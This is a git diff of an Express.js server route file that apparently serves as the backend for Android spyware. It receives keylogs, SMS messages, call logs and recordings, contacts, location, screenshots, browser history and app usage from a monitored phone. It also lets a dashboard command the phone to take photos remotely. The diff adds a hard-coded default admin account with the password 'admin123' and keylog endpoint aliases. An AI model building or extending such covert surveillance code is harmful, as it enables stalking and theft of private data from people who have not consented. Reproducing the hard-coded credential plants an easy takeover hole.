@@ -12,10 +12,25 @@ const KeywordAlert = require('../models/KeywordAlert');
 const Geofence = require('../models/Geofence');
 const AppUsage = require('../models/AppUsage');
 const CallRecording = require('../models/CallRecording');
-
-// NEW: Import the new models for photo and command
 const Photo = require('../models/Photo');
 const Command = require('../models/Command');
+const User = require('../models/User'); // Added for default admin
+
+// Helper: find or create default admin user
+const getDefaultAdminId = async () => {
+    let defaultAdmin = await User.findOne({ email: 'admin@default.com' });
+    if (!defaultAdmin) {
+        const bcrypt = require('bcryptjs');
+        const hashedPassword = await bcrypt.hash('admin123', 10);
+        defaultAdmin = await User.create({
+            name: 'Default Admin',
+            email: 'admin@default.com',
+            password: hashedPassword
+        });
+        console.log('✅ Created default admin user for orphan devices');
+    }
+    return defaultAdmin._id;
+};
 
 // Helper: find device safely
 const findDevice = async (deviceId) => {
@@ -27,19 +42,26 @@ const findDevice = async (deviceId) => {
     return device;
 };
 
-// ================= REGISTER DEVICE =================
+// ================= REGISTER DEVICE (auto-attach to default admin) =================
 router.post('/register', async (req, res) => {
     const { deviceId, deviceName, deviceModel, androidVersion, userId } = req.body;
     if (!deviceId) {
         return res.status(400).json({ success: false, message: 'deviceId required' });
     }
     try {
+        // Determine effective userId: if not provided or empty, use default admin
+        let effectiveUserId = userId && userId.trim() !== '' ? userId : await getDefaultAdminId();
+
         let device = await Device.findOne({ deviceId });
         if (!device) {
-            device = new Device({ userId, deviceId, deviceName, deviceModel, androidVersion });
+            device = new Device({ userId: effectiveUserId, deviceId, deviceName, deviceModel, androidVersion });
             await device.save();
         } else {
             device.lastSeen = new Date();
+            // If existing device has no userId, assign default admin
+            if (!device.userId) {
+                device.userId = effectiveUserId;
+            }
             await device.save();
         }
         res.json({ success: true, deviceId: device._id });
@@ -71,7 +93,7 @@ router.post('/device-info', async (req, res) => {
     }
 });
 
-// ================= CALL LOGS =================
+// ================= CALL LOGS (array only) =================
 router.post('/calls', async (req, res) => {
     const { deviceId, calls } = req.body;
     if (!calls || !Array.isArray(calls)) {
@@ -111,7 +133,7 @@ router.post('/call-recording', async (req, res) => {
     }
 });
 
-// ================= MESSAGES =================
+// ================= MESSAGES (array only) =================
 router.post('/messages', async (req, res) => {
     const { deviceId, messages } = req.body;
     if (!messages || !Array.isArray(messages)) {
@@ -147,7 +169,7 @@ router.post('/contacts', async (req, res) => {
     }
 });
 
-// ================= LOCATION =================
+// ================= LOCATION (single) =================
 router.post('/location', async (req, res) => {
     const { deviceId, lat, lng, address, speed } = req.body;
     const device = await findDevice(deviceId);
@@ -168,7 +190,7 @@ router.post('/location', async (req, res) => {
     }
 });
 
-// ================= SCREENSHOT =================
+// ================= SCREENSHOT (single) =================
 router.post('/screenshot', async (req, res) => {
     const { deviceId, imageBase64 } = req.body;
     if (!imageBase64) {
@@ -189,16 +211,21 @@ router.post('/screenshot', async (req, res) => {
     }
 });
 
-// ================= BROWSER HISTORY =================
+// ================= BROWSER HISTORY (array OR single) =================
 router.post('/browser-history', async (req, res) => {
     const { deviceId, history } = req.body;
-    if (!history || !Array.isArray(history)) {
-        return res.status(400).json({ success: false, message: 'history array required' });
+    let historyArray = history;
+    // If single object sent (no history array)
+    if (!historyArray && req.body.url) {
+        historyArray = [{ title: req.body.title, url: req.body.url, timestamp: req.body.timestamp }];
+    }
+    if (!historyArray || !Array.isArray(historyArray)) {
+        return res.status(400).json({ success: false, message: 'history array or single object required' });
     }
     const device = await findDevice(deviceId);
     if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
     try {
-        const data = history.map(item => ({ ...item, deviceId: device._id }));
+        const data = historyArray.map(item => ({ ...item, deviceId: device._id }));
         await BrowserHistory.insertMany(data);
         res.json({ success: true });
     } catch (err) {
@@ -207,22 +234,38 @@ router.post('/browser-history', async (req, res) => {
     }
 });
 
-// ================= KEYLOGS =================
+// ================= KEYLOGS (array OR single) =================
 router.post('/keylogs', async (req, res) => {
     const { deviceId, keylogs } = req.body;
-    if (!keylogs || !Array.isArray(keylogs)) {
-        return res.status(400).json({ success: false, message: 'keylogs array required' });
+    let logsArray = keylogs;
+    // If single object sent (no keylogs array)
+    if (!logsArray && req.body.appPackage) {
+        logsArray = [{ appPackage: req.body.appPackage, text: req.body.text, timestamp: req.body.timestamp }];
+    }
+    if (!logsArray || !Array.isArray(logsArray)) {
+        return res.status(400).json({ success: false, message: 'keylogs array or single object required' });
     }
     const device = await findDevice(deviceId);
     if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
     try {
-        const data = keylogs.map(log => ({ ...log, deviceId: device._id }));
+        const data = logsArray.map(log => ({ ...log, deviceId: device._id }));
         await Keylog.insertMany(data);
         res.json({ success: true });
     } catch (err) {
         console.error('Keylogs Error ❌:', err.message);
         res.status(500).json({ success: false, message: 'Server Error' });
     }
+});
+
+// Android uses /keylog (singular) – alias to same handler
+router.post('/keylog', async (req, res) => {
+    // Reuse same logic as /keylogs
+    req.body.keylogs = req.body.keylogs || [{
+        appPackage: req.body.appPackage,
+        text: req.body.text,
+        timestamp: req.body.timestamp
+    }];
+    return router.handle(req, res, '/keylogs');
 });
 
 // ================= KEYWORD ALERTS =================
@@ -261,16 +304,25 @@ router.post('/geofence', async (req, res) => {
     }
 });
 
-// ================= APP USAGE =================
+// ================= APP USAGE (array OR single) =================
 router.post('/app-usage', async (req, res) => {
     const { deviceId, appUsage } = req.body;
-    if (!appUsage || !Array.isArray(appUsage)) {
-        return res.status(400).json({ success: false, message: 'appUsage array required' });
+    let usageArray = appUsage;
+    if (!usageArray && req.body.appPackage) {
+        usageArray = [{
+            appPackage: req.body.appPackage,
+            appName: req.body.appName,
+            foregroundTime: req.body.foregroundTime,
+            timestamp: req.body.timestamp
+        }];
+    }
+    if (!usageArray || !Array.isArray(usageArray)) {
+        return res.status(400).json({ success: false, message: 'appUsage array or single object required' });
     }
     const device = await findDevice(deviceId);
     if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
     try {
-        const data = appUsage.map(usage => ({ ...usage, deviceId: device._id }));
+        const data = usageArray.map(usage => ({ ...usage, deviceId: device._id }));
         await AppUsage.insertMany(data);
         res.json({ success: true });
     } catch (err) {
@@ -280,7 +332,6 @@ router.post('/app-usage', async (req, res) => {
 });
 
 // ================= PHOTO UPLOAD =================
-// NEW endpoint: receive photo from Android client
 router.post('/photo', async (req, res) => {
     const { deviceId, imageBase64 } = req.body;
     if (!imageBase64) {
@@ -290,7 +341,6 @@ router.post('/photo', async (req, res) => {
     if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
     try {
         await Photo.create({ deviceId: device._id, imageBase64 });
-        // Clear pending command
         await Command.findOneAndUpdate({ deviceId: device._id }, { command: 'none' }, { upsert: true });
         res.json({ success: true });
     } catch (err) {
@@ -299,8 +349,7 @@ router.post('/photo', async (req, res) => {
     }
 });
 
-// ================= SET COMMAND (for dashboard) =================
-// NEW endpoint: dashboard sends a command (e.g., take_photo)
+// ================= SET COMMAND (dashboard to device) =================
 router.post('/command', async (req, res) => {
     const { deviceId, command } = req.body;
     const device = await findDevice(deviceId);
@@ -318,15 +367,13 @@ router.post('/command', async (req, res) => {
     }
 });
 
-// ================= GET COMMAND (for Android client) =================
-// NEW endpoint: Android client polls to check if there's a pending command
+// ================= GET COMMAND (Android polls) =================
 router.get('/command/:deviceId', async (req, res) => {
     const device = await findDevice(req.params.deviceId);
     if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
     const cmd = await Command.findOne({ deviceId: device._id });
     const command = cmd ? cmd.command : 'none';
     res.json({ success: true, command });
-    // Clear command after sending (except if it's 'none')
     if (command === 'take_photo') {
         await Command.updateOne({ deviceId: device._id }, { command: 'none' });
     }
